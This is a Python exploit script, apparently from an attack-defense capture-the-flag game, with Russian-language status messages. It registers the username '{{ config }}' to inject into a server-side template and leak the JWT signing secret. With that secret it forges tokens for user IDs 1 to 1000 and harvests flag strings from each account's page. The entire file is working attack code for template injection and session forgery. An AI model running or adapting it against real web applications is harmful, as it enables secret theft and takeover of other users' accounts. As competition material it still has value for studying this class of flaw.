#!/usr/bin/env python3
import sys
import requests
import re
import jwt
from urllib.parse import quote

TIMEOUT = 5
SECRET_KEY_PATTERN = re.compile(r"JWT_SECRET_KEY[^\w]*['\"]*([a-f0-9]{64})")
DESCRIPTION_PATTERN = re.compile(r'<div class="description-text">\s*(.*?)\s*</div>', re.DOTALL)
FLAG_PATTERN = re.compile(r'[A-Z0-9]{31}=')


def register_or_login(session, base_url, username, password):
    encoded_username = quote(username)
    data = f"username={encoded_username}&password={password}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    r = session.post(f"{base_url}/register", data=data, headers=headers, timeout=TIMEOUT)
    if r.status_code == 200:
        return True, r
    elif r.status_code == 400:
        r = session.post(f"{base_url}/login", data=data, headers=headers, timeout=TIMEOUT)
        return r.status_code == 200, r
    return False, r


def get_jwt_secret(host, port):
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    print("[*] Получение JWT_SECRET_KEY через SSTI...")
    success, _ = register_or_login(session, base_url, "{{ config }}", "123")
    if not success:
        print("[!] Не удалось получить доступ с SSTI payload")
        return None
    r = session.get(f"{base_url}/", timeout=TIMEOUT)
    if r.status_code != 200:
        print(f"[!] Ошибка получения страницы: HTTP {r.status_code}")
        return None
    content = r.text
    if "JWT_SECRET_KEY" in content:
        pos = content.find("JWT_SECRET_KEY")
        context = content[pos:pos+200]
        hex_match = re.search(r'([a-f0-9]{64})', context)
        if hex_match:
            secret_key = hex_match.group(1)
            print(f"[+] Найден JWT_SECRET_KEY: {secret_key}")
            return secret_key
    content = content.replace("&amp;#39;", "'").replace("&amp;quot;", '"')
    secret_match = SECRET_KEY_PATTERN.search(content)
    if secret_match:
        secret_key = secret_match.group(1)
        print(f"[+] Найден JWT_SECRET_KEY: {secret_key}")
        return secret_key
    print("[!] JWT_SECRET_KEY не найден")
    return None


def get_original_token(host, port):
    base_url = f"http://{host}:{port}"
    session = requests.Session()
    import random
    test_username = f"user_{random.randint(10000, 99999)}"
    success, _ = register_or_login(session, base_url, test_username, "123")
    if not success:
        print("[!] Не удалось получить тестового пользователя")
        return None
    access_token = session.cookies.get("access_token")
    if not access_token:
        print("[!] access_token не найден в cookies")
        return None
    return access_token


def create_forged_tokens(original_token, secret_key, start_id=1, end_id=1000):
    try:
        header = jwt.get_unverified_header(original_token)
        payload = jwt.decode(original_token, options={"verify_signature": False})
        print(f"[*] Оригинальный payload: {payload}")
        print(f"[*] Алгоритм: {header['alg']}")
        forged_tokens = {}
        for user_id in range(start_id, end_id + 1):
            new_payload = payload.copy()
            new_payload["sub"] = str(user_id)
            forged_token = jwt.encode(new_payload, secret_key, algorithm=header['alg'])
            forged_tokens[user_id] = forged_token
        print(f"[+] Создано {len(forged_tokens)} поддельных токенов")
        return forged_tokens
    except Exception as e:
        print(f"[!] Ошибка при создании токенов: {e}")
        return None


def extract_flags(host, port, forged_tokens):
    base_url = f"http://{host}:{port}"
    flags_found = []
    print(f"[*] Поиск флагов у пользователей 1-{len(forged_tokens)}...")
    for user_id, token in forged_tokens.items():
        session = requests.Session()
        session.cookies.set("access_token", token)
        try:
            r = session.get(f"{base_url}/", timeout=TIMEOUT)
            if r.status_code == 200:
                desc_match = DESCRIPTION_PATTERN.search(r.text)
                if desc_match:
                    description = desc_match.group(1).strip()
                    description = re.sub(r'<[^>]+>', '', description)
                    description = description.replace("&nbsp;", " ").strip()
                    flags = FLAG_PATTERN.findall(description)
                    for flag in flags:
                        if flag not in flags_found:
                            flags_found.append(flag)
                            print(f"[+] Пользователь {user_id}: {flag}")
        except requests.RequestException:
            pass
        if user_id % 100 == 0:
            print(f"[*] Проверено: {user_id}/{len(forged_tokens)} | Найдено флагов: {len(flags_found)}")
    return flags_found


def main():
    if len(sys.argv) < 3:
        print("Usage: sploit.py HOST PORT [START_ID] [END_ID]")
        print("Example: sploit.py 127.0.0.1 1337 1 1000")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    start_id = 1
    end_id = 1000
    if len(sys.argv) >= 4:
        start_id = int(sys.argv[3])
    if len(sys.argv) >= 5:
        end_id = int(sys.argv[4])
    secret_key = get_jwt_secret(host, port)
    if not secret_key:
        print("[!] Не удалось получить JWT_SECRET_KEY")
        sys.exit(1)
    original_token = get_original_token(host, port)
    if not original_token:
        print("[!] Не удалось получить оригинальный токен")
        sys.exit(1)
    forged_tokens = create_forged_tokens(original_token, secret_key, start_id, end_id)
    if not forged_tokens:
        print("[!] Не удалось создать поддельные токены")
        sys.exit(1)
    flags = extract_flags(host, port, forged_tokens)
    print("\n" + "="*50)
    print("НАЙДЕННЫЕ ФЛАГИ:")
    print("="*50)
    if flags:
        for flag in flags:
            print(flag)
        print(f"\n[*] Всего найдено флагов: {len(flags)}")
    else:
        print("[!] Флаги не найдены")
    print(f"\n[*] Готово! Проверено пользователей: {end_id - start_id + 1}")


if __name__ == "__main__":
    main()